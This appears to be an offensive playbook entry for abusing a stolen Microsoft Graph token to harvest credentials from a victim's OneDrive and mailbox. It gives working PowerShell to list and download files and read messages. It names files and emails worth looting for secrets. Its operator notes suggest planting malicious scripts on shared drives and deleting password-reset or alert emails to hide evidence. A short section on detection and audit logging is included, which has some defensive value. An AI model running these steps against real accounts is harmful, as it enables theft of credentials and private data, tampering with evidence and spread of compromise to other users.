## Overview

A Graph token with `Files.Read` and `Mail.Read` delegated scopes provides direct access to the compromised identity's OneDrive files and email inbox. These two surfaces are routinely used to distribute credentials, scripts with embedded secrets, and access links — making them high-value targets after a token is acquired.

Both vectors operate on the same delegated token. No additional authentication or privilege escalation is required once the scopes are present.

## Preconditions

| Requirement | Detail |
|---|---|
| Delegated Graph token | Must correspond to the target identity |
| `Files.Read` or `Files.ReadWrite` | To enumerate and download OneDrive content |
| `Mail.Read` or `Mail.ReadWrite` | To enumerate and read inbox messages |

## Vector 1 — OneDrive File Enumeration

```powershell
# List root directory contents
$result = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" `
    -Headers @{ Authorization = "Bearer $Graph" }

$result.value | Select-Object name, size, lastModifiedDateTime,
    @{n="type"; e={if ($_.folder) {"folder"} elseif ($_.file) {"file"} else {"unknown"}}} |
    Sort-Object lastModifiedDateTime -Descending | Format-Table
```

Files worth targeting:

| File type | Why |
|---|---|
| `.ps1`, `.py`, `.sh` scripts | May contain hardcoded credentials, connection strings, API keys |
| `.json`, `.env`, `.config` files | Application configuration with secrets |
| `.pfx`, `.p12` certificates | Private key material |
| `passwords.*`, `creds.*` | Self-explanatory |

Downloading a specific file:

```powershell
$item = $result.value | Where-Object { $_.name -eq "<target-file>" }
Invoke-WebRequest -Uri $item.'@microsoft.graph.downloadUrl' -OutFile $item.name
```

The `@microsoft.graph.downloadUrl` field contains a pre-authenticated URL — no additional authorization header is needed for the download request.

## Vector 2 — Mailbox Read

```powershell
# List recent messages
$messages = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=25&`$orderby=receivedDateTime desc&`$select=subject,from,receivedDateTime,id" `
    -Headers @{ Authorization = "Bearer $Graph" }

$messages.value | Select-Object subject, @{n="from"; e={$_.from.emailAddress.address}},
    receivedDateTime | Format-Table

# Read full body of a specific message
$body = (Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/messages/<MESSAGE_ID>?`$select=body" `
    -Headers @{ Authorization = "Bearer $Graph" }).body.content
```

Messages worth targeting:

- IT helpdesk emails with temporary passwords or account setup instructions
- Password reset notifications (contain credentials or reset links)
- Internal system access onboarding emails
- Responses to credential requests between staff members

## Operator Notes

- Start with recently modified files in OneDrive (`Sort-Object lastModifiedDateTime -Descending`) — actively used files are more likely to contain current credentials.
- Search mail by subject or sender: `?$filter=contains(subject,'password')` or `?$filter=from/emailAddress/address eq '<it-admin@domain.com>'`.
- `Files.ReadWrite` also allows writing files — useful for planting malicious scripts if the identity has access to shared drives used by others.
- The `@microsoft.graph.downloadUrl` in OneDrive responses is a time-limited SAS-style URL. Download before it expires.
- If the identity has `Mail.ReadWrite`, messages can be deleted after reading — use to remove evidence of alerts or password reset emails.

## Detection / Friction Points

- OneDrive access is logged in the Microsoft 365 Unified Audit Log under `FileDownloaded` and `FileAccessed` events — requires Advanced Audit or E5 licensing.
- Mail reads appear under `MailItemsAccessed` events — high-volume reads or access from unusual IPs may trigger alerts.
- Both operations are attributed to the compromised identity in logs — the activity appears as normal user behavior unless volume or timing is anomalous.
- Graph API access to mail and files generates `MessageRead` and `DriveItem` events in Microsoft Defender for Cloud Apps — useful for behavioral baseline deviation detection.
